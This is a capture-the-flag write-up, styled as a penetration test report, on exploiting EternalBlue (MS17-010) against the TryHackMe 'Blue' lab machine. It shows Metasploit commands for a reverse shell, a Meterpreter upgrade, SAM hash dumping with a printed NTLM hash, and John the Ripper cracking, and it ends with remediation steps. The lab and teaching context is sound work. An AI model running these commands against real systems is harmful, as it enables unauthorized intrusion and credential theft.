# Penetration Testing Report: TryHackMe – Blue (MS17-010 / EternalBlue)

**Target IP:** `10.48.153.87`

**Severity:** Critical

**CVSS v3.1 Score:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Assessment Date:** October 2026

**Methodology:** Information Gathering, Service Enumeration, Vulnerability Analysis, Exploitation, Post-Exploitation & Privilege Escalation.

---

## Executive Summary

During an authorized security assessment of the target environment (`Blue`), an unauthenticated remote code execution (RCE) vulnerability was identified in the Server Message Block version 1 (SMBv1) protocol. The target host running Windows was found susceptible to **MS17-010 (CVE-2017-0144)**, commonly known as **EternalBlue**.

Exploitation of this vulnerability allowed complete system compromise, enabling full administrative access (`NT AUTHORITY\SYSTEM`), extraction of local account NTLM password hashes, and unauthorized access to sensitive local files across the file system.

---

## Scope & Target Information

* **Host Name:** Blue (TryHackMe)
* **Target Operating System:** Windows Server / Windows 8.1 / Windows 7
* **Vulnerable Service:** SMBv1 (Port 445/TCP)
* **Primary Exploited CVE:** CVE-2017-0144 (MS17-010)

---

## Technical Findings & Walkthrough

### 1. Service Enumeration (`Nmap`)

An initial network port scan and SMB vulnerability scan were conducted against the target IP address to identify open services and potential security flaws:

```bash
# General Service and Script Scan
nmap -sV -sC -Pn 10.48.153.87 -oN blue_initial.txt

# SMB Vulnerability Assessment
nmap -p 445 --script vuln 10.48.153.87 -oN blue_smb_vuln.txt

```

**Key Findings:**

* Port `445/TCP` running Microsoft-DS SMB.
* Nmap NSE script output confirmed the target is vulnerable to `ms17-010` (Remote Code Execution vulnerability in Microsoft SMBv1 servers).

---

### 2. Exploitation (`Metasploit Framework`)

The vulnerability was exploited using the Metasploit Framework module dedicated to MS17-010:

* **Module Used:** `exploit/windows/smb/ms17_010_eternalblue`
* **Payload:** `windows/x64/shell/reverse_tcp`

```text
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.48.153.87
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

```

Upon successful execution, an initial low-level command shell session was established on the target host.

---

### 3. Post-Exploitation & Session Upgrade

To enable advanced post-exploitation capabilities, the initial command shell was backgrounded and upgraded to a full Meterpreter session using the `post/multi/manage/shell_to_meterpreter` module:

```text
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
msf6 post(multi/manage/shell_to_meterpreter) > set LHOST tun0
msf6 post(multi/manage/shell_to_meterpreter) > set LPORT 4433
msf6 post(multi/manage/shell_to_meterpreter) > run

```

After switching to the upgraded Meterpreter session (`sessions -i 2`), user privileges were verified:

```text
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

**Result:** Immediate full-system administrative access (`NT AUTHORITY\SYSTEM`) was achieved due to kernel-level exploitation of the SMB service.

---

### 4. Credential Dumping & Password Analysis

With system-level access, local NTLM password hashes were extracted directly from the Windows Security Account Manager (SAM) database:

```text
meterpreter > hashdump
Jon:1002:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

```

#### Hash Analysis & Cracking

* **User:** `Jon` (RID: 1002)
* **NTLM Hash:** `ffb43f0de35be4d9917ac0cc8ad57f8d`

The NTLM hash was extracted and cracked offline using **John the Ripper** with the `rockyou.txt` wordlist:

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

```

```bash
john --format=NT --show hash.txt

```

---

### 5. Flag Retrieval & Proof of Concept

System artifacts and proof-of-concept flags were retrieved across multiple directories on the host:

1. **Flag 1 (System Root):**
Path: `C:/flag1.txt`
2. **Flag 2 (Windows SAM/Config Directory):**
Path: `C:/Windows/System32/config/flag2.txt`
3. **Flag 3 (User Documents):**
Path: `C:/Users/Jon/Documents/flag3.txt`

```text
meterpreter > cat "C:/Users/Jon/Documents/flag3.txt"
flag{3xx_xXXXX_XXXXX}

```

---

## Remediation & Risk Mitigation

1. **Disable SMBv1:** Disable the legacy SMBv1 protocol entirely across all network assets in favor of SMBv2 or SMBv3.
2. **Apply Security Updates:** Install security update **MS17-010** (Microsoft Security Bulletin) or apply the latest Windows Cumulative Security Patch.
3. **Network Segmentation:** Implement firewalls to restrict inbound SMB traffic (ports `139/TCP` and `445/TCP`) from untrusted network zones or the public Internet.
